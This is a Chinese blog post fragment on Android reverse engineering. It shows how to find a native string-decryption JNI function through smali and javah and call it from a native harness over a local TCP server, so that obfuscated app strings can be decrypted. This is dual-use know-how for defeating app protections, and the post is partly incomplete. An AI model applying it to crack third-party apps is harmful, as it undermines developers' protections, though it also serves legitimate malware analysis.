<h2 id="逆向-Dex"><a href="#逆向-Dex" class="headerlink" title="逆向 Dex"></a>逆向 Dex</h2><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">.local v1, "encryptedStringBytes":[B</div><div class="line">invoke-static &#123;&#125;, Lorg/cf/nativeharness/Cryptor;-&gt;getInstance()Lorg/cf/nativeharness/Cryptor;</div><div class="line">move-result-object v0</div><div class="line"></div><div class="line">.line 21</div><div class="line">.local v0, "c":Lorg/cf/nativeharness/Cryptor;</div><div class="line"></div><div class="line"># v3 contains a String made from encrypted bytes</div><div class="line">new-instance v3, Ljava/lang/String;</div><div class="line">invoke-direct &#123;v3, v1&#125;, Ljava/lang/String;-&gt;&lt;init&gt;([B)V</div><div class="line"></div><div class="line"># Call the decryption method, move result back to v3</div><div class="line">invoke-virtual &#123;v0, v3&#125;, Lorg/cf/nativeharness/Cryptor;-&gt;decryptString(Ljava/lang/String;)Ljava/lang/String;</div><div class="line"></div><div class="line">move-result-object v3</div></pre></td></tr></table></figure>
<p>注意：这里调用 native 函数的指令是<code>invoke-virtual</code>, 这个指令一般用来调用实例方法，虚方法等。指令的第一个参数就是 class 实例。</p>
<p>注意：native 方法 和 <code>invoke-virtual</code> 没有直接联系。存在 static native 的方法，这时候使用<code>invoke-static</code>，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">private static native void post_arm64Load0(Library this, long arg1) &#123;</div><div class="line">    &#125;</div><div class="line">.method private static native post_arm64Load0(J)V</div><div class="line">.end method</div><div class="line"></div><div class="line"></div><div class="line">调用代码</div><div class="line">00000060  iget-wide               v2, v0, Library-&gt;a:J</div><div class="line">00000064  invoke-static           Library-&gt;post_arm64Load0(J)V, v2, v3</div></pre></td></tr></table></figure></p>
<hr>
<p>下一步 我们要查看目标 jni 函数的签名，两种方法：</p>
<ol>
<li>通过反编译 so</li>
<li>但是方法1有可能 so 做了加固，查看不到函数签名；所以要使用 javah 生成头文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ d2j-dex2jar.sh app-universal-debug.apk</div><div class="line">dex2jar app-universal-debug.apk -&gt; ./app-universal-debug-dex2jar.jar</div><div class="line">$ javah -cp app-universal-debug-dex2jar.jar:$ANDROID_SDK/platforms/android-19/android.jar org.cf.nativeharness.Cryptor</div></pre></td></tr></table></figure>
</li>
</ol>
<p>jni 函数前2个参数是固定的，从第3个参数开始是应用的参数。<br>这个 jobject 参数应该是 <code>org.cf.nativeharness.Cryptor</code>实例，实际的函数签名：<br><code>JNIEXPORT jstring JNICALL Java_org_cf_nativeharness_Cryptor_decryptString (JNIEnv *, jobject, jstring);</code></p>
<p>定义目标函数类型：<br><code>typedef jstring(*decryptString_t)(JNIEnv *, jobject, jstring);</code></p>
<h2 id="定义一个-server-socket"><a href="#定义一个-server-socket" class="headerlink" title="定义一个 server socket"></a>定义一个 server socket</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
<h3 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h3><pre><code>1. 将目标 apk（或者 Dex、Jar）放在`/data/local/tmp/target-app.apk`,创建 VM 时的参数(`-Djava.class.path=/data/local/tmp/target-app.apk`)
2. 将需要的 native 库放在 `/data/local/tmp` (`-Djava.library.path=/data/local/tmp`)
3. 使用客户端  python 脚本时，需要 adb forward tcp:5001 tcp:5001
</code></pre><p>harness.c 文件主要负责：</p>
<ol>
<li>加载目标native 动态库</li>
<li>调用 native 中的 JNI_OnLoad 函数</li>
<li>创建 VM 虚拟机，加载目标 Dex 和 libs</li>
<li>[可选] 如果不是 <code>static native</code> 方法，需要创建实例对象 jobject, 如果是 static 方法可以给 jobject 传递 NULL.</li>
<li>开启 TCP socket server （5001端口）</li>
</ol>
<p>server.c 文件功能：</p>
<ol>
<li>绑定 TCP 服务到5001 端口， 负责从客户端接受 参数传递个解密函数。</li>
</ol>
<h3 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h3><p>harness  <libxx.so>   开启服务<br>decrypt_string.py</libxx.so></p>
<p>介绍完整个使用流程，第一感觉就是复杂,每次添加目标函数都要重新编译 harness,还不如 直接 frida-hook。确实，这种方法的好处是 适合解密量较大的情况。</p>
<p>如果要是换个 apk 破解，需要修改流程：</p>
<ol>
<li>找到要调用的 jni 函数，参看签名信息（是否需要创建 jobject）</li>
<li>[可选]在 harness.c 中 创建 class 实例</li>
<li>server.c 中修改 调用目标函数的代码。<br>注释不要删。。</li>
</ol>
<p>测试阶段：</p>
<ol>
<li>编译 apk 。。。</li>
</ol>
<h3 id="ChangeLog"><a href="#ChangeLog" class="headerlink" title="ChangeLog"></a>ChangeLog</h3><table>
<thead>
<tr>
<th>Time</th>
<th>Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>2017-4-19</td>
<td>创建</td>
</tr>
<tr>
<td></td>
<td>测试 art 模式</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Title: &lt;a href=&quot;https://calebfenton.github.io/2017/04/14/calling_jni_functions_with_java_object_arguments_from_the_command_line/&quot;&gt;Calling JNI Functions with Java Object Arguments from the Command Line&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Core Skill: 在 native 层创建 Android 虚拟机，并调用 jni 方法。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://calebfenton.github.io/&quot;&gt;Caleb Fenton’s Blog&lt;/a&gt;中包含很多关于 android 开发的技术，特别是虚拟机相关的技术。&lt;strong&gt;介绍的非常详细&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://yoursite.com/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="public intelligence" scheme="http://yoursite.com/tags/public-intelligence/"/>
    
  </entry>
  
</feed>
